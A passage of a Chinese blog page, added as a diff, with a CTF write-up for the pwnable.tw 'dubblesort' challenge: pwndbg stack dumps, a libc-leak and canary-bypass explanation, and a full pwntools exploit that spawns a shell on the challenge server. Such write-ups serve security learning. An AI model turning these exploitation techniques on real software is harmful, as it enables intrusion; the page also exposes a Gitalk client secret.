+</li>
+<li>
+<p>先看看栈上有没有什么有用的数据</p>
+<ul>
+<li>
+<p>查看栈上信息</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">esp</span>      <span class="number">0xffffd1b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│          <span class="number">0xffffd1b4</span> —▸ <span class="number">0x56555c24</span> ◂— <span class="keyword">dec</span>    <span class="built_in">eax</span> /* <span class="string">'Hello %s,How many numbers do you what to sort :'</span> */</span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│          <span class="number">0xffffd1b8</span> —▸ <span class="number">0xffffd1ec</span> ◂— <span class="number">0x74736574</span> (<span class="string">'test'</span>)</span><br><span class="line"><span class="number">03</span>:000c│          <span class="number">0xffffd1bc</span> —▸ <span class="number">0xf7eaf76b</span> ◂— <span class="keyword">add</span>    <span class="built_in">esp</span>, <span class="number">0x10</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│          <span class="number">0xffffd1c0</span> —▸ <span class="number">0xffffd1ee</span> ◂— <span class="number">0xd40a7473</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│          <span class="number">0xffffd1c4</span> —▸ <span class="number">0xffffd2ec</span> —▸ <span class="number">0xffffd4a8</span> ◂— <span class="string">'CLUTTER_IM_MODULE=fcitx'</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│          <span class="number">0xffffd1c8</span> ◂— <span class="number">0xe0</span></span><br><span class="line"><span class="number">07</span>:001c│          <span class="number">0xffffd1cc</span> —▸ <span class="number">0xf7f3c48a</span> ◂— <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">0x18</span>]</span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│          <span class="number">0xffffd1d0</span> —▸ <span class="number">0xffffd1ef</span> —▸ <span class="number">0xffd40a74</span> ◂— <span class="number">0xffd40a74</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>│          <span class="number">0xffffd1d4</span> ◂— <span class="number">0x0</span></span><br><span class="line">0a:<span class="number">0028</span>│          <span class="number">0xffffd1d8</span> ◂— <span class="number">0xc30000</span></span><br><span class="line"><span class="number">0b</span>:002c│          <span class="number">0xffffd1dc</span> ◂— <span class="number">0x1</span></span><br><span class="line">0c:<span class="number">0030</span>│          <span class="number">0xffffd1e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0d</span>:<span class="number">0034</span>│          <span class="number">0xffffd1e4</span> —▸ <span class="number">0xffffd48b</span> ◂— <span class="string">'/root/Desktop/Pwn/dubblesort'</span></span><br><span class="line">0e:<span class="number">0038</span>│          <span class="number">0xffffd1e8</span> —▸ <span class="number">0xf7fd0000</span> ◂— <span class="number">0x1afdb0</span></span><br><span class="line">0f:003c│ <span class="built_in">ecx</span> <span class="built_in">esi</span>  <span class="number">0xffffd1ec</span> ◂— <span class="number">0x74736574</span> (<span class="string">'test'</span>)</span><br><span class="line"><span class="number">10</span>:<span class="number">0040</span>│          <span class="number">0xffffd1f0</span> —▸ <span class="number">0xffffd40a</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0044</span>│          <span class="number">0xffffd1f4</span> ◂— <span class="number">0x2f</span> /* <span class="string">'/'</span> */</span><br><span class="line"><span class="number">12</span>:<span class="number">0048</span>│          <span class="number">0xffffd1f8</span> ◂— <span class="number">0x9e</span></span><br><span class="line"><span class="number">13</span>:004c│          <span class="number">0xffffd1fc</span> ◂— <span class="number">0x16</span></span><br><span class="line"><span class="number">14</span>:<span class="number">0050</span>│          <span class="number">0xffffd200</span> ◂— <span class="number">0x8000</span></span><br><span class="line"><span class="number">15</span>:<span class="number">0054</span>│          <span class="number">0xffffd204</span> —▸ <span class="number">0xf7fd0000</span> ◂— <span class="number">0x1afdb0</span></span><br><span class="line"><span class="number">16</span>:<span class="number">0058</span>│          <span class="number">0xffffd208</span> —▸ <span class="number">0xf7fce244</span> —▸ <span class="number">0xf7e38020</span> ◂— <span class="keyword">call</span>   <span class="number">0xf7f3d0d9</span></span><br><span class="line"><span class="number">17</span>:005c│          <span class="number">0xffffd20c</span> —▸ <span class="number">0x56555601</span> ◂— <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="number">0x199f</span></span><br><span class="line"><span class="number">18</span>:<span class="number">0060</span>│          <span class="number">0xffffd210</span> —▸ <span class="number">0x565557a9</span> ◂— <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="number">0x17f7</span></span><br><span class="line"><span class="number">19</span>:<span class="number">0064</span>│          <span class="number">0xffffd214</span> —▸ <span class="number">0x56556fa0</span> ◂— <span class="number">0x1ea8</span></span><br><span class="line">1a:<span class="number">0068</span>│          <span class="number">0xffffd218</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">1b</span>:006c│          <span class="number">0xffffd21c</span> —▸ <span class="number">0x56555b72</span> ◂— <span class="keyword">add</span>    <span class="built_in">edi</span>, <span class="number">1</span></span><br><span class="line">1c:<span class="number">0070</span>│          <span class="number">0xffffd220</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">1d</span>:<span class="number">0074</span>│          <span class="number">0xffffd224</span> —▸ <span class="number">0xffffd2e4</span> —▸ <span class="number">0xffffd48b</span> ◂— <span class="string">'/root/Desktop/Pwn/dubblesort'</span></span><br><span class="line">1e:<span class="number">0078</span>│          <span class="number">0xffffd228</span> —▸ <span class="number">0xffffd2ec</span> —▸ <span class="number">0xffffd4a8</span> ◂— <span class="string">'CLUTTER_IM_MODULE=fcitx'</span></span><br><span class="line">1f:007c│          <span class="number">0xffffd22c</span> ◂— <span class="number">0x19d01800</span></span><br><span class="line"><span class="number">20</span>:<span class="number">0080</span>│          <span class="number">0xffffd230</span> —▸ <span class="number">0xf7fd03dc</span> —▸ <span class="number">0xf7fd11e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0084</span>│          <span class="number">0xffffd234</span> —▸ <span class="number">0xffffd47b</span> ◂— <span class="string">'i686'</span></span><br><span class="line"><span class="number">22</span>:<span class="number">0088</span>│          <span class="number">0xffffd238</span> —▸ <span class="number">0x56555b2b</span> ◂— <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="number">0x1475</span></span><br><span class="line"><span class="number">23</span>:008c│          <span class="number">0xffffd23c</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0090</span>│          <span class="number">0xffffd240</span> —▸ <span class="number">0xf7fd0000</span> ◂— <span class="number">0x1afdb0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">26</span>:<span class="number">0098</span>│ <span class="built_in">ebp</span>      <span class="number">0xffffd248</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">27</span>:009c│          <span class="number">0xffffd24c</span> —▸ <span class="number">0xf7e38637</span> (__libc_start_main+<span class="number">247</span>) ◂— <span class="keyword">add</span>    <span class="built_in">esp</span>, <span class="number">0x10</span></span><br><span class="line"><span class="number">28</span>:00a0│          <span class="number">0xffffd250</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">29</span>:00a4│          <span class="number">0xffffd254</span> —▸ <span class="number">0xffffd2e4</span> —▸ <span class="number">0xffffd48b</span> ◂— <span class="string">'/root/Desktop/Pwn/dubblesort'</span></span><br><span class="line">2a:00a8│          <span class="number">0xffffd258</span> —▸ <span class="number">0xffffd2ec</span> —▸ <span class="number">0xffffd4a8</span> ◂— <span class="string">'CLUTTER_IM_MODULE=fcitx'</span></span><br><span class="line">2b:00ac│          <span class="number">0xffffd25c</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">2e:00b8│          <span class="number">0xffffd268</span> —▸ <span class="number">0xf7fd0000</span> ◂— <span class="number">0x1afdb0</span></span><br><span class="line">2f:00bc│          <span class="number">0xffffd26c</span> —▸ <span class="number">0xf7ffdc04</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">30</span>:00c0│          <span class="number">0xffffd270</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">31</span>:00c4│          <span class="number">0xffffd274</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>再看看此时的内存分布情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">0x56555000 0x56556000 r-xp     1000 0      &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;dubblesort</span><br><span class="line">0x56556000 0x56557000 r--p     1000 0      &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;dubblesort</span><br><span class="line">0x56557000 0x5655a000 rw-p     3000 1000   &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;dubblesort</span><br><span class="line">0xf7e1f000 0xf7e20000 rw-p     1000 0</span><br><span class="line">0xf7e20000 0xf7fcd000 r-xp   1ad000 0      &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;libc_32.so.6</span><br><span class="line">0xf7fcd000 0xf7fce000 ---p     1000 1ad000 &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;libc_32.so.6</span><br><span class="line">0xf7fce000 0xf7fd0000 r--p     2000 1ad000 &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;libc_32.so.6</span><br><span class="line">0xf7fd0000 0xf7fd1000 rw-p     1000 1af000 &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;libc_32.so.6</span><br><span class="line">0xf7fd1000 0xf7fd5000 rw-p     4000 0</span><br><span class="line">0xf7fd5000 0xf7fd8000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd8000 0xf7fd9000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 r-xp    23000 0      &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;tmp&#x2F;x86_ld-2.23.so.2</span><br><span class="line">0xf7ffc000 0xf7ffd000 r--p     1000 22000  &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;tmp&#x2F;x86_ld-2.23.so.2</span><br><span class="line">0xf7ffd000 0xf7ffe000 rw-p     1000 23000  &#x2F;root&#x2F;Desktop&#x2F;Pwn&#x2F;tmp&#x2F;x86_ld-2.23.so.2</span><br><span class="line">0xfff00000 0xffffe000 rw-p    fe000 0      [stack]</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>通过以上信息，我们可以得知，栈上有一个指向<code>libc</code>的指针（位于上面的<code>0xffffd208</code>处）</p>
+</li>
+</ul>
+</li>
+<li>
+<p>所以，通过<code>scanf</code>将栈上指向<code>libc</code>的指针的值泄露出来，再减去相应的偏移值，我们就可以得到<code>libc base</code>，进而得到<code>system addr</code>和<code>/bin/sh addr</code>。</p>
+</li>
+<li>
+<p>接下来我们就得将<code>system addr</code>和<code>/bin/sh addr</code>送到<code>old eip</code>和<code>old eip - 4*2</code>处</p>
+<ul>
+<li>位置的变化我们可以利用程序中的<code>dubblesort</code>函数
+<ul>
+<li>注意<code>dubblesort</code>是将数据从小到大依次排序，所以我们需要精心构造栈上的值，设置不同的大小，<br>
+从而使<code>canary</code>在排序过后还是在原来的地方，而<code>system addr</code>和<code>/bin/sh addr</code>换到我们需要的位置</li>
+</ul>
+</li>
+<li>但当程序让我们输入<code>n</code>个数时，原来在栈上的数据就会被覆盖，而<code>Canary</code>自然也不例外。<br>
+所以我们需要在正常结束当前<code>scanf</code>调用的情况下，不修改该<code>scanf</code>存放新数字的栈位置上的值
+<ul>
+<li>我们可以利用<code>scanf</code>的如下特性来完成我们的目的：
+<blockquote>
+<p>当<code>scanf</code>只读取到<code>“+”</code>或<code>“-”</code>时，<code>scanf</code>不做任何操作，所以存放新数字的栈位置上的值可以得以保留。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="解决方案-3">解决方案</h3>
+<ol>
+<li>构建特殊字符串，泄露<code>libc base</code></li>
+<li>精心布置栈上数据，利用<code>dubblesort</code>将我们构建的<code>system addr</code>和<code>'/bin/sh' addr</code> 换到<code>old eip</code> 和 <code>old eip - 2 * 4</code> 这两个位置。</li>
+<li>待程序执行冒泡排序后，<code>ret</code>即可<code>get shell</code>。</li>
+</ol>
+<h4 id="EXP-3">EXP</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10101</span>)</span><br><span class="line"><span class="comment"># io = process("./dubblesort")</span></span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'x86'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露栈上数据， 得到libc base</span></span><br><span class="line">io.sendafter(<span class="string">"What your name :"</span>, <span class="string">"a"</span>*<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">libc_base = u32(io.recv(<span class="number">40</span>)[<span class="number">34</span>:<span class="number">38</span>]) - <span class="number">0x1ae244</span></span><br><span class="line">shell_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment"># 注意： shell_addr &gt; system_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 布置栈上数据</span></span><br><span class="line">io.sendlineafter(<span class="string">"How many numbers do you what to sort :"</span>, <span class="string">"35"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">"number : "</span>, <span class="string">"0"</span>)</span><br><span class="line"><span class="comment"># 绕过canary，不修改它</span></span><br><span class="line">io.sendlineafter(<span class="string">"number : "</span>, <span class="string">"+"</span>)</span><br><span class="line"><span class="comment"># 修改canary之后的9个值</span></span><br><span class="line">io.sendlineafter(<span class="string">"number : "</span>, str(system_addr))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">"number : "</span>, str(system_addr - i))</span><br><span class="line"><span class="comment"># 写入参数</span></span><br><span class="line">io.sendlineafter(<span class="string">"number : "</span>, str(shell_addr))</span><br><span class="line"><span class="comment"># 丢弃垃圾信息</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="随笔-2">随笔</h3>
+<p>这题的关键在于认识到栈上数据的敏感性。<br>
+尽管当前函数并没有写入什么数据到栈上，但栈上却残留着上一个函数遗留下的信息。<br>
+好好利用一番也可得到意外的收获。（亏我当初看<code>dubblesort</code>排序函数看了辣么久…）</p>
+<h3 id="参考-3">参考</h3>
+<blockquote>
+<p><a href="https://bbs.pediy.com/thread-254868.htm" target="_blank" rel="noopener">关于不同版本 glibc 更换的一些问题</a></p>
+</blockquote>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2020/03/pwnable.tw/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/03/heap-1-arena/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            heap - 1 - arena
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/02/HNUCTF2020-pwn/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">HNUCTF2020 部分题解</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
